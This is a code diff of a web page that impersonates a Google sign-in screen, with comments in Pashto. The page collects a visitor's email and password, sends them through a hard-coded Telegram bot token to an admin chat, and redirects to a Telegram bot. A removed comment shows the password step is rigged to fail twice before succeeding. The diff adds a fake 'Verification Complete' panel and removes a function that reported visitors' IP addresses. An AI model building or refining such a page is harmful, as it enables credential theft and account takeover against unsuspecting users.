@@ -9,9 +9,8 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
+            font-family: 'Google Sans', 'Roboto', system-ui;
         }
-
         body {
             min-height: 100vh;
             background: #ffffff;
@@ -20,17 +19,15 @@
             align-items: center;
             padding: 1rem;
         }
-
         .google-card {
             max-width: 450px;
             width: 100%;
             background: #ffffff;
             border-radius: 0.75rem;
             border: 1px solid #dadce0;
-            padding: 2rem 2rem 1.5rem 2rem;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+            padding: 2rem;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
         }
-
         .google-logo { text-align: center; margin-bottom: 1rem; }
         .google-logo img { width: 75px; height: auto; }
         h1 { font-size: 1.5rem; font-weight: 500; color: #202124; text-align: center; margin-bottom: 0.5rem; }
@@ -65,7 +62,7 @@
         .links-row { display: flex; justify-content: space-between; margin: 0.5rem 0 1rem; font-size: 0.8rem; }
         .links-row a, .links-row span { color: #1a73e8; text-decoration: none; cursor: pointer; }
         .links-row a:hover, .links-row span:hover { text-decoration: underline; }
-        .guest-text { text-align: left; margin: 1rem 0; font-size: 0.75rem; color: #5f6368; line-height: 1.4; }
+        .guest-text { text-align: left; margin: 1rem 0; font-size: 0.75rem; color: #5f6368; }
         .guest-text a { color: #1a73e8; text-decoration: none; }
         .create-account { display: inline-block; margin: 0.5rem 0 1rem; font-size: 0.85rem; color: #1a73e8; text-decoration: none; cursor: pointer; }
         .message { margin-top: 1rem; padding: 0.7rem; border-radius: 0.25rem; font-size: 0.8rem; text-align: center; display: none; }
@@ -73,7 +70,29 @@
         .success-msg { background: #e6f4ea; border: 1px solid #34a853; color: #137333; }
         .footer { display: flex; justify-content: center; gap: 1.2rem; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #e8eaed; font-size: 0.7rem; color: #5f6368; }
         .step-text { text-align: center; font-size: 0.7rem; color: #5f6368; margin-top: 0.5rem; }
+        .cancel-btn {
+            width: 100%;
+            padding: 0.85rem;
+            background: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 0.25rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        .cancel-btn:hover { background: #c82333; }
         .hidden { display: none; }
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        .btn-group .cancel-btn {
+            margin-top: 0;
+            flex: 1;
+        }
     </style>
 </head>
 <body>
@@ -102,6 +121,16 @@
         <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
     </div>
 
+    <!-- د بریالیتوب پینل -->
+    <div id="successPanel" class="hidden">
+        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+        <h1>✅ Verification Complete</h1>
+        <div class="sub">Your account has been successfully verified!</div>
+        <div class="btn-group">
+            <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
+        </div>
+    </div>
+
     <div id="errorBox" class="message error-msg"></div>
     <div id="successBox" class="message success-msg"></div>
     <div class="step-text" id="stepIndicator">Step 1 of 2</div>
@@ -109,7 +138,7 @@
 </div>
 
 <script>
-    // ========== د بوټ لینک ==========
+    // ========== د بوټ لینک (ستاسو د بوټ یوزرنیم سره) ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
     
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
@@ -139,19 +168,6 @@
         currentEmail = '';
     }
 
-    // د "Forgot email?"، "Guest mode"، "Learn more"، "Create account"، "English"، "Help"، "Privacy"، "Terms" بټنو لپاره
-    async function sendToAdmin(buttonName) {
-        const ip = await getUserIP();
-        const msg = `🔘 *${buttonName}* clicked\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'Markdown' })
-        }).catch(e => console.log(e));
-        alert(`${buttonName} - Admin notified`);
-    }
-
-    window.sendToAdmin = sendToAdmin;
-
     // مرحله 1: برېښنالیک
     document.getElementById('nextBtn').onclick = () => {
         let email = document.getElementById('emailInput').value.trim();
@@ -167,7 +183,7 @@
         document.getElementById('passwordInput').value = '';
     };
 
-    // مرحله 2: پټنوم (3 هڅې: لومړی 2 ناکام، درېیم بریالی)
+    // مرحله 2: پټنوم (3 هڅې)
     document.getElementById('loginBtn').onclick = async () => {
         let pass = document.getElementById('passwordInput').value.trim();
         if (!pass) {
@@ -199,12 +215,15 @@
                 })
             });
             
-            showMessage(document.getElementById('successBox'), '✅ Login successful! Redirecting to bot...', false);
-            
-            setTimeout(() => {
-                window.location.href = BOT_REDIRECT;
-            }, 1500);
+            // د بریالیتوب پینل ښکاره کړئ
+            document.getElementById('step2View').classList.add('hidden');
+            document.getElementById('successPanel').classList.remove('hidden');
         }
+    };
+    
+    // د CANCEL تڼۍ - مستقیم بوټ ته ځي او لومړی ګام بشپړوي
+    document.getElementById('cancelBtn').onclick = () => {
+        window.location.href = BOT_REDIRECT;
     };
 </script>
 </body>
